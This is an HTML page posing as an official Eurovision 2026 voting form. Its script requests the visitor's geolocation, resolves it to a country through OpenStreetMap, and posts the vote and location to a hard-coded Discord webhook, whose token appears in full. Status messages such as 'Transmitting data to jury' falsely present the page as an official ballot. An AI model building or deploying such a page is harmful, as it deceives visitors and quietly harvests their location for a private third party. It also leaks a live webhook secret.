<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eurovision 2026 - Cast Your Vote</title>
    <style>
        :root {
            --bg-gradient: linear-gradient(135deg, #0f051d 0%, #291147 100%);
            --card-bg: rgba(255, 255, 255, 0.06);
            --card-border: rgba(255, 255, 255, 0.1);
            --text-main: #ffffff;
            --text-muted: #b3a4c4;
            --euro-pink: #ff007f;
            --euro-cyan: #00f0ff;
            --success-green: #00ffaa;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: var(--bg-gradient);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .voting-card {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid var(--card-border);
            border-radius: 24px;
            width: 100%;
            max-width: 440px;
            padding: 40px 30px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            text-align: center;
        }

        .logo-area {
            margin-bottom: 30px;
        }

        .logo-area h1 {
            font-size: 28px;
            font-weight: 800;
            letter-spacing: 1px;
            text-transform: uppercase;
            background: linear-gradient(45deg, var(--euro-cyan), var(--euro-pink));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .logo-area p {
            color: var(--text-muted);
            font-size: 14px;
            margin-top: 8px;
        }

        .options-grid {
            display: flex;
            flex-direction: column;
            gap: 16px;
            margin-bottom: 30px;
        }

        .country-option {
            background: rgba(255, 255, 255, 0.03);
            border: 2px solid var(--card-border);
            border-radius: 16px;
            padding: 16px;
            display: flex;
            align-items: center;
            cursor: pointer;
            transition: all 0.25s ease;
            position: relative;
        }

        .country-option:hover {
            border-color: var(--euro-cyan);
            background: rgba(0, 240, 255, 0.05);
            transform: translateY(-2px);
        }

        /* Hidden radio input but functional */
        .country-option input[type="radio"] {
            position: absolute;
            right: 20px;
            accent-color: var(--euro-pink);
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        .country-option.selected {
            border-color: var(--euro-pink);
            background: rgba(255, 0, 127, 0.08);
            box-shadow: 0 0 15px rgba(255, 0, 127, 0.2);
        }

        .flag-wrapper {
            font-size: 28px;
            margin-right: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 40px;
            height: 40px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }

        .country-name {
            font-size: 18px;
            font-weight: 600;
            color: var(--text-main);
        }

        .submit-btn {
            background: linear-gradient(90deg, var(--euro-pink), #m00050);
            background-size: 200% auto;
            color: white;
            border: none;
            border-radius: 14px;
            padding: 16px;
            font-size: 16px;
            font-weight: 700;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 0, 127, 0.3);
        }

        .submit-btn:hover {
            background-position: right center;
            box-shadow: 0 6px 20px rgba(255, 0, 127, 0.5);
            transform: translateY(-1px);
        }

        .submit-btn:disabled {
            background: #443c52;
            color: #7a6e8a;
            box-shadow: none;
            cursor: not-allowed;
            transform: none;
        }

        #status-message {
            margin-top: 20px;
            font-size: 14px;
            font-weight: 500;
            min-height: 20px;
            color: var(--text-muted);
            transition: color 0.3s ease;
        }
    </style>
</head>
<body>

<div class="voting-card">
    <div class="logo-area">
        <h1>Eurovision</h1>
        <p>Select your favorite performance to lock in your vote</p>
    </div>

    <div class="options-grid">
        <label class="country-option" onclick="selectOption(this)">
            <div class="flag-wrapper">🇷🇸</div>
            <span class="country-name">Serbia</span>
            <input type="radio" name="eurovote" value="Serbia">
        </label>

        <label class="country-option" onclick="selectOption(this)">
            <div class="flag-wrapper">🇲🇰</div>
            <span class="country-name">North Macedonia</span>
            <input type="radio" name="eurovote" value="North Macedonia">
        </label>

        <label class="country-option" onclick="selectOption(this)">
            <div class="flag-wrapper">🇩🇰</div>
            <span class="country-name">Denmark</span>
            <input type="radio" name="eurovote" value="Denmark">
        </label>
    </div>

    <button id="voteBtn" class="submit-btn" onclick="processVote()" disabled>Cast Your Vote</button>
    <div id="status-message">Choose a country to unlock voting</div>
</div>

<script>
    const webhookUrl = "https://discord.com/api/webhooks/1507776763747369102/vzLoZmpA9ye2kd_pakmF5oGALF5pu_otrgNOAvPq3jAgS3akuPVuDQODYUXeXRvwYUHA";

    // Visually toggle UI states when a row is clicked
    function selectOption(element) {
        document.querySelectorAll('.country-option').forEach(opt => {
            opt.classList.remove('selected');
        });
        element.classList.add('selected');
        
        // Find the radio button inside and check it
        const radio = element.querySelector('input[type="radio"]');
        radio.checked = true;

        // Enable the submit button
        const voteBtn = document.getElementById('voteBtn');
        voteBtn.disabled = false;
        document.getElementById('status-message').innerText = `Ready to vote for ${radio.value}!`;
        document.getElementById('status-message').style.color = "var(--text-muted)";
    }

    async function processVote() {
        const status = document.getElementById('status-message');
        const voteBtn = document.getElementById('voteBtn');
        const selectedRadio = document.querySelector('input[name="eurovote"]:checked');

        if (!selectedRadio) return;
        const votedCountry = selectedRadio.value;

        // Disable everything during processing
        voteBtn.disabled = true;
        status.innerText = "Accessing secure location data...";
        status.style.color = "var(--euro-cyan)";

        if (!navigator.geolocation) {
            status.innerText = "Location unsupported by browser. Sending vote...";
            sendPayload(votedCountry, "Unknown (No Geolocation Support)");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                status.innerText = "Resolving voting region...";

                try {
                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                    const data = await response.json();
                    const userCountry = data.address && data.address.country ? data.address.country : "Unknown Country";
                    
                    status.innerText = "Transmitting data to jury...";
                    sendPayload(votedCountry, userCountry);
                } catch (error) {
                    status.innerText = "Network slowdown. Finalizing vote...";
                    sendPayload(votedCountry, `Coordinates: ${lat.toFixed(2)}, ${lon.toFixed(2)}`);
                }
            },
            (error) => {
                status.innerText = "Location permission denied. Sending anonymously...";
                sendPayload(votedCountry, "Anonymous / Location Hidden");
            }
        );
    }

    async function sendPayload(votedCountry, userLocation) {
        const status = document.getElementById('status-message');
        
        const payload = {
            embeds: [{
                title: "🗳️ Official Eurovision Vote Logged",
                color: 16711807, // Euro Pink Hex
                fields: [
                    { name: "Entry Selection", value: `**${votedCountry}**`, inline: true },
                    { name: "Voter Origin", value: `🌍 ${userLocation}`, inline: true }
                ],
                footer: { text: "Eurovision Core Voting Module" },
                timestamp: new Date().toISOString()
            }]
        };

        try {
            const response = await fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                status.innerText = "✅ Your vote has been officially registered!";
                status.style.color = "var(--success-green)";
            } else {
                status.innerText = "❌ Transmission error. Please try again.";
                status.style.color = "#ff4d4d";
                document.getElementById('voteBtn').disabled = false;
            }
        } catch (err) {
            status.innerText = "❌ Network error connection failure.";
            status.style.color = "#ff4d4d";
            document.getElementById('voteBtn').disabled = false;
        }
    }
</script>

</body>
</html>
